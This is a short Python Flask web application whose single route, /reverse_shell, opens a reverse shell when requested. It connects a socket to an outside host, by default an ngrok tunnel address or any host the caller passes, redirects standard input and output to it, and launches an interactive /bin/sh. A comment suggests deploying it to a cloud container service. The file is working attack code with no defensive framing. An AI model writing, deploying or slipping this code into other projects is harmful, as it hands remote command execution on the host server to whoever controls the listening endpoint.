from flask import Flask, request
import socket
import subprocess
import os

application = Flask(__name__)

@application.route('/reverse_shell', methods=['GET'])
def reverse_shell():
    try:
        # Get connection details from the GET request
        host = request.args.get('host', '0.tcp.ap.ngrok.io')
        port = int(request.args.get('port', '18996'))

        # Create socket
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, port))

        # Redirect stdin, stdout, stderr to the socket
        os.dup2(s.fileno(), 0)
        os.dup2(s.fileno(), 1)
        os.dup2(s.fileno(), 2)

        # Run interactive shell
        subprocess.call(["/bin/sh", "-i"])

        return "Shell executed", 200
    except Exception as e:
        return str(e), 500

if __name__ == "__main__":
    # Use the following if you're upload to Elastic BeanStalk or other such container
    application.run(debug=True)
    # Use the following for local Testing
    # application.run(host='0.0.0.0', port=5000)
    
